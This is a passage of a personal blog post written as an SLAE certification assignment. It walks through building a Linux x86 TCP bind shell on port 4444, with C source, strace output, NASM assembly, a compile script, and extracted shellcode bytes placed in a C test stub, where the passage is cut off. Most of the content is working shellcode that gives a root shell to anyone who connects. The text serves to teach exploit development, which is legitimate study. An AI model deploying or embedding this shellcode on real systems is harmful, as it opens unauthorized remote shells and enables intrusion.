<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Brett Lischalk | SLAE Problem 1: TCP Bind Shell Shellcode</title>
  <meta name="description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode">
  <meta property="og:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta property="og:site_name" content="Brett Lischalk">
  <meta property="og:image" content="http://localhost:4000/assets/og-image.jpg">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="http://localhost:4000/posts/slae-problem-1-tcp-bind-shellcode">
  <meta name="twitter:title" content="SLAE Problem 1: TCP Bind Shell Shellcode">
  <meta name="twitter:description" content="From my experience playing around with socket programming in C and Python, there is a basic formula and group of function calls for creating clients and servers. Most of them will be useful to us. A couple won't be applicable to our situation.">
  <meta name="twitter:image" content="http://localhost:4000/assets/og-image.jpg">

  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="Brett Lischalk Last 10 blog posts" />

  
    <link type="text/css" rel="stylesheet" href="/assets/dark.css">
  
</head>

<body>
  <main role="main">
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav reveal">
  <a href="/" class="header-logo" title="Brett Lischalk">Brett Lischalk</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <span class="icon icon-android-person"></span>
        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/blischalk" target="_blank" title="Twitter">
          <span class="icon icon-social-twitter"></span>
        </a>
      </li>
    
    
    
      <li>
        <a href="https://github.com/blischalk" target="_blank" title="GitHub">
          <span class="icon icon-social-github"></span>
        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/brett-lischalk-3104537" target="_blank" title="LinkedIn">
          <span class="icon icon-social-linkedin"></span>
        </a>
      </li>
    
    
    
      <li>
        <a href="mailto:brett@brettlischalk.com" target="_blank" title="Email">
          <span class="icon icon-at"></span>
        </a>
      </li>
    
    
      <li>
        <a href="/feed.xml" target="_blank" title="RSS">
          <span class="icon icon-social-rss"></span>
        </a>
      </li>
    
  </ul>
</nav>

        <article class="article reveal">
          <header class="article-header">
            <h1>SLAE Problem 1: TCP Bind Shell Shellcode</h1>
            <div class="article-list-footer">
              <span class="article-list-date">
                December 18, 2016
              </span>
              <span class="article-list-divider">-</span>
              <span class="article-list-minutes">
                
                
                  14 minute read
                
              </span>
              <span class="article-list-divider">-</span>
              <div class="article-list-tags">
                
                  <a href="/tag/asm">asm</a>
                
                  <a href="/tag/shellcode">shellcode</a>
                
                  <a href="/tag/c">c</a>
                
              </div>
            </div>
          </header>

          <div class="article-content">
            <h1 id="assignment-1">Assignment 1<a id="sec-1" name="sec-1"></a></h1>

<p>This blog post has been created for completing the requirements fo the SecurityTube
Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert"><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></a></p>

<p>Student ID: SLAE-824</p>

<h2 id="requirements">Requirements<a id="sec-1-1" name="sec-1-1"></a></h2>

<ul>
  <li>Create a Shell Bind TCP shellcode
    <ul>
      <li>Bind to a port</li>
      <li>Execs Shell on incoming connection</li>
    </ul>
  </li>
  <li>Port number should be easily configurable</li>
</ul>

<h2 id="strategy">Strategy<a id="sec-1-2" name="sec-1-2"></a></h2>

<p>My approach to building a tcp bind shell shellcode will be to:</p>

<ul>
  <li>Create a C program which illustrates the basic functionality</li>
  <li>Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks</li>
  <li>Lookup the system calls and see what arguments and structures they take</li>
  <li>Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does</li>
  <li>Debug issues as of course there will be :)</li>
</ul>

<h2 id="the-source-code">The Source Code<a id="sec-1-3" name="sec-1-3"></a></h2>

<p>The source code and tools referenced in this article can be found here:
<a href="https://github.com/blischalk/slae/tree/master/exercise1">The Source Code and Tools</a></p>

<h2 id="the-c-program">The C program<a id="sec-1-4" name="sec-1-4"></a></h2>

<p>From my experience playing around with socket programming in C and
Python, there is a basic formula and group of function calls for
creating clients and servers. Most of them will be useful to us. A
couple won’t be applicable to our situation.  The functions we will
find useful are:</p>

<ul>
  <li>Socket: Open a socket over which we will communicate. Essentially a file descriptor</li>
  <li>Bind: Bind our socket to an interface on our system</li>
  <li>Listen: Tell our system that we are ready to start accepting connections</li>
  <li>Accept: Accept the connection. This is a necessary next step as listen will generally queue up connections in anticipation of them being accepted</li>
</ul>

<p>Functions we won’t worry about:</p>

<ul>
  <li>Send</li>
  <li>Recv</li>
  <li>Connect</li>
  <li>Close</li>
</ul>

<p>We won’t worry about send or recv because they are used for managing
the flow of data coming in and out and acting accordingly.  We are
instead going to just redirect stdin, stdout, and stderr over the
socket using a function called dup2 and not worry about managing the
flow of data. Since we aren’t connecting to another system/server we
don’t need to worry about connect. And as for close, it is generally
good practice to close files after your done with them but one leaked
file descriptor won’t hurt anyone right? We need to trim the fat!</p>

<p>The final step after we get our redirection going is we just need to
run a program, in our case <code class="highlighter-rouge">/bin/sh</code> and its output and input should
be connected to our socket. We can run this program using <code class="highlighter-rouge">execve</code>.</p>

<p>So lets get some code going!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">      <span class="cp">#include &lt;stdio.h&gt;
</span>      <span class="cp">#include &lt;netinet/in.h&gt;
</span>      <span class="cp">#define PORT 4444
</span>    
      <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Create a socket
</span>        <span class="kt">int</span> <span class="n">lsock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    
        <span class="c1">// Setup servr side config struct
</span>        <span class="c1">// We configure:
</span>        <span class="c1">// The family:IPv4
</span>        <span class="c1">// The interface: 0.0.0.0 (any)
</span>        <span class="c1">// The port: port#
</span>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">config</span><span class="p">;</span>
        <span class="n">config</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
        <span class="n">config</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
        <span class="c1">// The htons() function converts the
</span>        <span class="c1">// unsigned short integer hostshort from host byte
</span>        <span class="c1">// order to network byte order.
</span>        <span class="n">config</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
    
        <span class="c1">// Bind the created socket with the interface
</span>        <span class="c1">// specified in the configuration
</span>        <span class="n">bind</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">config</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">config</span><span class="p">));</span>
    
        <span class="c1">// Listen on the socket
</span>        <span class="n">listen</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    
        <span class="c1">// Accept the incoming connection
</span>        <span class="kt">int</span> <span class="n">csock</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">lsock</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    
        <span class="c1">// Redirect stdin, stdout, and stderror
</span>        <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">dup2</span><span class="p">(</span><span class="n">csock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    
        <span class="c1">// Execute a shell
</span>        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">};</span></code></pre></figure>

<p>Compiling this code with <code class="highlighter-rouge">gcc bindshell.c -o bindshell</code> gives us a
nice executable. Running the executable with <code class="highlighter-rouge">./bindshell</code> and then
looking at our network using <code class="highlighter-rouge">netstat -antp</code> yields something very
interesting:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    root@blahblah:~# netstat <span class="nt">-atp</span> Active Internet connections <span class="o">(</span>servers and
    established<span class="o">)</span> Proto Local Address Foreign Address State PID/Program
    name tcp <span class="k">*</span>:4444 <span class="k">*</span>:<span class="k">*</span> LISTEN 1657/bindshell</code></pre></figure>

<p>Excellent! We have /bin/sh listen bound to a port. If we open up
another terminal and use netcat to connect to port 4444 by running <code class="highlighter-rouge">nc
-nv -nv 127.0.0.1 4444</code> we will get:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@blahblah:~# nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?)
open id uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>

<p>Perfect! We have a tcp bind shell connection. Now we have to convert
this to assembly…</p>

<h2 id="analysis-of-the-c-program">Analysis of the C program<a id="sec-1-5" name="sec-1-5"></a></h2>

<p>We can use a tool called <code class="highlighter-rouge">strace</code> to help us learn more about what system calls
our bind shell c program is making. Running <code class="highlighter-rouge">strace ./bindshell</code>, connecting
to the bindshell with <code class="highlighter-rouge">nc -nv 127.0.0.1 4444</code> and filtering out the noise
we will see:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@blahblah:~/shared/SLAE/slae/exercise1# strace ./bindshell
execve("./bindshell", ["./bindshell"], [/* 41 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept(3,
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", [0], [/* 0 vars */])  = 0
</code></pre></div></div>

<p>Ok. It looks like our code makes some system calls that seem to align with the
functions we know to be part of our socket programming formula along with the
stdin, stdout, and stderror redirection and our <code class="highlighter-rouge">execve</code> call to run /bin/sh.</p>

<p>Lets lookup the system calls to find out their system call numbers. We will
consult <code class="highlighter-rouge">/usr/include/i386-linux-gnu/asm/unistd_32.h</code> for these numbers…</p>

<p>When we consult the listing of syscalls we encounter a bit of confusion. The
only system calls that seem to closely match up with what we saw in our strace
are:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
#define __NR_mbind 274
</code></pre></div></div>

<p>This is strange. <code class="highlighter-rouge">execve</code> and <code class="highlighter-rouge">dup2</code> look good but there doesn’t seem to be
any syscall numbers for socket,listen, or accept. socketcall seems a bit odd
as does mbind so we will have to look into this.</p>

<p>Consulting <code class="highlighter-rouge">man socketcall</code> we learn:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int socketcall(int call, unsigned long *args);

/**
socketcall() is a common kernel entry point for the socket system
calls.  call determines which socket function to invoke.  args points
to a block containing the actual arguments, which are passed through
to the appropriate call.

User programs should call the appropriate functions by their usual
names.  Only standard library implementors and kernel hackers need to
know about socketcall().
**/
</code></pre></div></div>

<p>So that seems to explain things a little bit. The first argument to
socketcall is a number that represents the actual socket api function
that we want to be calling. Ok… Where do we get the number associated
with each of the api calls?</p>

<p>A little Google search for socketcall call numbers brings us:</p>

<p><a href="http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html">socketcall call numbers</a></p>

<p>In this blog post we confirm our knowledge about the first argument of
socketcall as well as learn about <code class="highlighter-rouge">/usr/include/linux/net.h</code></p>

<p>Lets checkout that file and see if we can learn the numbers we are looking
for.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define SYS_SOCKET  1   /* sys_socket(2)    */
#define SYS_BIND    2   /* sys_bind(2)      */
#define SYS_CONNECT 3   /* sys_connect(2)   */
#define SYS_LISTEN  4   /* sys_listen(2)    */
#define SYS_ACCEPT  5   /* sys_accept(2)    */
// ... snip
</code></pre></div></div>

<p>So it looks like the <code class="highlighter-rouge">mbind</code> syscall we saw earlier might not be
necessary as it looks like there is a <code class="highlighter-rouge">bind</code> syscall number that we
can call with <code class="highlighter-rouge">socketcall</code>.  We’ll try that out and see how that goes.</p>

<p>Now that we know the syscalls and their corresponding numbers, we need
to figure out their function signatures so that we know what sort of
arguments we need to be passing to them when we invoke them. The
metnod signatures look like the following:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">int</span> <span class="n">socketcall</span><span class="p">(</span><span class="kt">int</span> <span class="n">call</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">args</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">bind</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">accept</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="o">*</span><span class="n">addrlen</span><span class="p">)</span>
    <span class="kt">int</span> <span class="n">dup2</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newfd</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
    <span class="o">//</span> <span class="p">...</span> <span class="n">snip</span></code></pre></figure>

<p>We also leveraged 2 structs in our C program which we will most likely need
to replicate.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#include &lt;netinet/in.h&gt;
</span>    
    <span class="c1">// All pointers to socket address structures are often cast to pointers
</span>    <span class="c1">// to this type before use in various functions and system calls:
</span>    
    <span class="k">struct</span> <span class="n">sockaddr</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="kt">short</span>    <span class="n">sa_family</span><span class="p">;</span>    <span class="c1">// address family, AF_xxx
</span>        <span class="kt">char</span>              <span class="n">sa_data</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>  <span class="c1">// 14 bytes of protocol address
</span>    <span class="p">};</span>
    
    
    <span class="c1">// IPv4 AF_INET sockets:
</span>    
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="p">{</span>
        <span class="kt">short</span>            <span class="n">sin_family</span><span class="p">;</span>   <span class="c1">// e.g. AF_INET, AF_INET6
</span>        <span class="kt">unsigned</span> <span class="kt">short</span>   <span class="n">sin_port</span><span class="p">;</span>     <span class="c1">// e.g. htons(3490)
</span>        <span class="k">struct</span> <span class="n">in_addr</span>   <span class="n">sin_addr</span><span class="p">;</span>     <span class="c1">// see struct in_addr, below
</span>        <span class="kt">char</span>             <span class="n">sin_zero</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>  <span class="c1">// zero this if you want to
</span>    <span class="p">};</span></code></pre></figure>

<p>Ok. Using what we have gathered from our analysis lets take an attempt at
writing some assembly!</p>

<h2 id="assembly-take-1">Assembly: Take 1<a id="sec-1-6" name="sec-1-6"></a></h2>

<p>Lets lookup some values of constants:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/usr/src/linux-headers-4.0.0-kali1-common/include/linux/socket.h~

#define AF_INET   2 /* Internet IP Protocol   */
</code></pre></div></div>

<p>I had a hard time finding where <code class="highlighter-rouge">SOCK_STREAM</code> was defined so we use
a little gcc magic to see what the macro expands to:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@blahblah:~/shared/SLAE/slae/exercise1# gcc -DN -E bindshell.c | grep SOCK_STREAM
SOCK_STREAM = 1,
int lsock = socket(2, SOCK_STREAM, 0);

#define INADDR_ANY ((unsigned long int) 0x00000000)
</code></pre></div></div>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">    <span class="kr">global</span> <span class="n">_start</span>
    <span class="c">;; Note: We will store 2 file descriptors along the way</span>
    <span class="c">;; We will put the listening socket file descriptor in edi</span>
    <span class="c">;; We will put the connection socket file descriptor in ebx</span>
    
    <span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
      <span class="n">_start</span><span class="o">:</span>
        <span class="c">;; Create a socket</span>
        <span class="c">;; int socketcall(int call, unsigned long *args);</span>
        <span class="c">;; int socket(int domain, int type, int protocol);</span>
        <span class="c">;; #define SYS_SOCKET 1   /* sys_socket(2)    */</span>
        <span class="c">;; Use socketcall to call down to socket</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">; sys_socket syscall number</span>
    
        <span class="c">;; Put the socket() args on the stack</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Specify protocol as 0</span>
        <span class="k">push</span> <span class="n">ebx</span> <span class="c">; SOCK_STREAM is the type of socket 1</span>
        <span class="k">push</span> <span class="mh">0x2</span> <span class="c">; Domain af_inet sets protocol family to ip protocol 2</span>
    
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; Save pointer to args for the socket() call</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_socket</span>
    
        <span class="c">; Save the returned listening socket file descriptor</span>
        <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
        <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
    
        <span class="c">;; Bind the socket</span>
        <span class="c">;; Use socketcall to call down to socket</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">; sys_bind syscall number</span>
    
        <span class="c">;; Start building the sockaddr_in structure</span>
        <span class="c">;; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
        <span class="c">; sin_addr=0 (INADDR_ANY)</span>
        <span class="c">; INADDR_ANY Accept on any interface 0x00000000</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">push</span> <span class="n">ecx</span>
    
        <span class="c">;; 4444 is 0x115c in little endian. Network byte order is</span>
        <span class="c">;; Big endian so we swap the byte ordering</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x5c11</span> <span class="c">; sin_port=4444 (network byte order)</span>
        <span class="k">push</span> <span class="n">word</span> <span class="n">bx</span>     <span class="c">; sin_family=AF_INET (0x2)</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>     <span class="c">; move pointer to sockaddr_in structure</span>
    
        <span class="c">;; In the initial code we use sizeof to derive the addrlen</span>
        <span class="c">;; If we print the results of that we get 0x10 which is 16 bytes</span>
        <span class="k">push</span> <span class="mh">0x10</span> <span class="c">;addrlen=16</span>
        <span class="k">push</span> <span class="n">ecx</span>  <span class="c">;struct sockaddr pointer</span>
        <span class="k">push</span> <span class="n">edi</span>  <span class="c">;sockfd</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;save pointer to bind() args</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_bind</span>
    
        <span class="c">;; Call listen and prepare for accepting connections</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span> <span class="c">; sys_listen syscall number</span>
    
        <span class="c">;; Place listen's arguments on the stack</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; backlog we set to zero</span>
        <span class="k">push</span> <span class="n">edi</span> <span class="c">; push the socket file descriptor</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to the args in ecx</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_listen</span>
    
        <span class="c">;; Call accept</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">; socketcall syscall</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x5</span> <span class="c">; sys_accept syscall number</span>
        <span class="c">;; Place accept's arguments on the stack</span>
        <span class="c">;; We don't need a peer socket???... so we</span>
        <span class="c">;; use nulls for addrlen and sockaddr struct</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Push NULL (0x00000000) for addrlen</span>
        <span class="k">push</span> <span class="n">ecx</span> <span class="c">; Push NULL (0x00000000) for sockaddr struct</span>
        <span class="k">push</span> <span class="n">edi</span> <span class="c">; Push the listening sockets file descriptor</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">; place a pointer to the args in ecx</span>
        <span class="k">int</span> <span class="mh">0x80</span> <span class="c">; call sys_accept</span>
    
        <span class="c">;; Save the returned connection socket file descriptor</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>
    
        <span class="c">;; Call dup2 for stdin, stdout, and stderr in a loop</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;loop counter</span>
      <span class="n">dup2</span><span class="o">:</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span> <span class="c">;dup2</span>
        <span class="k">int</span> <span class="mh">0x80</span>
        <span class="k">dec</span> <span class="n">ecx</span>
        <span class="k">jns</span> <span class="n">dup2</span>
    
        <span class="c">;; Call execve</span>
        <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
        <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span> <span class="c">;execve</span>
        <span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span>
        <span class="k">push</span> <span class="n">ebx</span>
        <span class="k">push</span> <span class="mh">0x68732f2f</span> <span class="c">;"sh//"</span>
        <span class="k">push</span> <span class="mh">0x6e69622f</span> <span class="c">;"nib/"</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
        <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>
        <span class="k">int</span> <span class="mh">0x80</span></code></pre></figure>

<p>When we compile the above shellcode using the compile.sh script below:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">    <span class="c">#!/bin/bash</span>
    <span class="nb">echo</span> <span class="s1">'[+] Assembling with Nasm ... '</span>
    nasm <span class="nt">-f</span> elf32 <span class="nt">-o</span> <span class="nv">$1</span>.o <span class="nv">$1</span>.nasm
    
    <span class="nb">echo</span> <span class="s1">'[+] Linking ...'</span>
    ld <span class="nt">-o</span> <span class="nv">$1</span> <span class="nv">$1</span>.o
    
    <span class="nb">echo</span> <span class="s1">'[+] Done!'</span></code></pre></figure>

<p><code class="highlighter-rouge">root@blahblah:~/shared/SLAE/slae/exercise1# ./compile.sh bindshellasm</code></p>

<p>And run the shellcode using:</p>

<p><code class="highlighter-rouge">root@blahblah:~/shared/SLAE/slae/exercise1# ./bindshellasm</code></p>

<p>And connect using netcat:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
root@blahblah:~/shared/SLAE/slae/exercise1# nc <span class="nt">-nv</span> 127.0.0.1 4444
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 4444 <span class="o">(</span>?<span class="o">)</span> open
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Bingo! Our assembly works and gives us a tcp bind shell. Now we need to test it
in our c program stub. We will use some command line fu to get the opcodes
from our binary:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@funos:~/shared/SLAE/slae/exercise1# objdump -d ./bindshellasm|grep '[0-9a-f]:'| \
grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '\
|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31"
"\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04"
"\x31\xc9\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
"\x51\x57\x89\xe1\xcd\x80\x31\xdb\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49"
"\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
</code></pre></div></div>

<p>We add our opcodes to a stub tester C program:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cp">#include&lt;stdio.h&gt;
</span>    <span class="cp">#include&lt;string.h&gt;
</span>    
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
    <span class="s">"</span><span class="se">\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xff\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04</span><span class="s">"</span>
